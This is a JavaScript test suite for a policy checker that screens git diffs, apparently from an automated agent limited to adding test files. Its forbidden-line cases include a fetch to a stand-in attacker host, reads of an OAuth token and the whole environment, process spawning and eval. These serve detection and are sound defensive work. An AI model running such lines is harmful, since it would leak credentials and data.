import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { evaluatePolicy, parseDiffLines, parseNumstat, parseRaw } from '../lib/policy.mjs';

function change(file, lines, { status = 'A', removed = [], mode = '100644' } = {}) {
  return {
    entry: { file, status, newMode: mode },
    stats: { added: lines.length, removed: removed.length, bytes: lines.join('\n').length },
    diff: [`diff --git a/${file} b/${file}`, `--- ${status === 'A' ? '/dev/null' : `a/${file}`}`, `+++ b/${file}`, `@@ -1,${removed.length} +1,${lines.length} @@`, ...removed.map((line) => `-${line}`), ...lines.map((line) => `+${line}`)].join('\n'),
  };
}

function evaluate(...changes) {
  return evaluatePolicy({
    entries: changes.map((item) => item.entry),
    numstat: Object.fromEntries(changes.map((item) => [item.entry.file, item.stats])),
    diff: changes.map((item) => item.diff).join('\n'),
  });
}

const goodTest = ["import { it, expect } from 'vitest';", "it('works', () => expect(1).toBe(1));"];

describe('change policy', () => {
  it('accepts new and updated test files and fixtures', () => {
    const result = evaluate(
      change('backend/tests/config.test.ts', goodTest),
      change('frontend/src/lib/http.test.ts', goodTest, { status: 'M' }),
      change('frontend/src/test/queryWrapper.tsx', ['export const x = 1']),
    );
    assert.equal(result.passed, true, JSON.stringify(result.violations));
    assert.equal(result.addedLines, 5);
  });

  it('rejects production code, config and workflow changes', () => {
    const result = evaluate(
      change('backend/src/factory.ts', ['export {}'], { status: 'M' }),
      change('frontend/vite.config.ts', ['export {}'], { status: 'M' }),
      change('.github/workflows/ci.yml', ['on: push']),
      change('frontend/src/lib/http.ts', ['export {}'], { status: 'M' }),
    );
    assert.equal(result.passed, false);
    assert.deepEqual(result.violations.filter((v) => v.rule === 'path-not-allowed').map((v) => v.file), [
      'backend/src/factory.ts', 'frontend/vite.config.ts', '.github/workflows/ci.yml', 'frontend/src/lib/http.ts',
    ]);
  });

  it('rejects deletions, symlinks and binaries', () => {
    const deleted = change('backend/tests/router.test.ts', [], { status: 'D', mode: '000000' });
    const symlink = change('backend/tests/link.test.ts', goodTest, { mode: '120000' });
    const binary = change('frontend/src/test/blob.ts', goodTest);
    binary.stats = { binary: true };
    const rules = evaluate(deleted, symlink, binary).violations.map((v) => v.rule);
    assert.deepEqual(rules.sort(), ['binary', 'change-type', 'file-mode']);
  });

  const forbidden = [
    ['focused-or-skipped-test', "it.only('x', () => {})"],
    ['focused-or-skipped-test', "describe.skip('x', () => {})"],
    ['focused-or-skipped-test', "test.todo('later')"],
    ['focused-or-skipped-test', "xit('x', () => {})"],
    ['type-check-suppression', '// @ts-ignore'],
    ['process-spawning', "import { exec } from 'node:child_process';"],
    ['raw-network', "import net from 'net';"],
    ['external-host', "await fetch('https://attacker.example.net/x')"],
    ['credential-access', 'const token = process.env.CLAUDE_CODE_OAUTH_TOKEN;'],
    ['credential-access', 'console.log(JSON.stringify(process.env))'],
    ['dynamic-code', "eval('1')"],
  ];
  for (const [rule, line] of forbidden) {
    it(`flags ${rule}: ${line}`, () => {
      const result = evaluate(change('backend/tests/x.test.ts', [...goodTest, line]));
      assert.deepEqual(result.violations.map((v) => [v.rule, v.line]), [[rule, 3]]);
    });
  }

  it('allows local URLs, stubbed env and expected-error comments', () => {
    const result = evaluate(change('backend/tests/x.test.ts', [
      ...goodTest,
      "createDatabase('postgresql://test:test@localhost:5432/test');",
      "await request('http://localhost:8000/api');",
      "vi.stubEnv('POSTGRES_PASSWORD', 'secret');",
      '// @ts-expect-error invalid on purpose',
    ]));
    assert.deepEqual(result.violations, []);
  });

  it('requires assertions in new test files', () => {
    const result = evaluate(change('backend/tests/empty.test.ts', ["it('does nothing', () => {});"]));
    assert.deepEqual(result.violations.map((v) => v.rule), ['no-assertions']);
  });

  it('warns when existing assertions or shared fixtures change', () => {
    const result = evaluate(
      change('backend/tests/router.test.ts', goodTest, { status: 'M', removed: ['  expect(response.status).toBe(201);'] }),
      change('backend/tests/fixture.ts', ['export const extra = 1;'], { status: 'M' }),
    );
    assert.equal(result.passed, true);
    assert.equal(result.warnings.length, 2);
  });

  it('limits the size of a change', () => {
    const lines = Array.from({ length: 4001 }, (_, index) => `expect(${index}).toBe(${index});`);
    assert.ok(evaluate(change('backend/tests/huge.test.ts', lines)).violations.some((v) => v.rule === 'too-many-lines'));
  });
});

describe('git output parsers', () => {
  it('parses raw diff entries', () => {
    const raw = ':000000 100644 0000000 1111111 A\0backend/tests/a.test.ts\0:100644 000000 2222222 0000000 D\0backend/tests/b.test.ts\0';
    assert.deepEqual(parseRaw(raw), [
      { status: 'A', file: 'backend/tests/a.test.ts', oldMode: '000000', newMode: '100644' },
      { status: 'D', file: 'backend/tests/b.test.ts', oldMode: '100644', newMode: '000000' },
    ]);
  });

  it('parses numstat including binaries', () => {
    assert.deepEqual(parseNumstat('3\t1\ta.ts\n-\t-\tb.png\n', { 'a.ts': 99 }), {
      'a.ts': { added: 3, removed: 1, bytes: 99 }, 'b.png': { binary: true },
    });
  });

  it('tracks added line numbers across hunks', () => {
    const diff = ['+++ b/f.ts', '@@ -1,0 +5,2 @@', '+a', '+b', '@@ -9 +20 @@', '-old', '+new'].join('\n');
    assert.deepEqual(parseDiffLines(diff)['f.ts'].added, [{ line: 5, text: 'a' }, { line: 6, text: 'b' }, { line: 20, text: 'new' }]);
  });
});
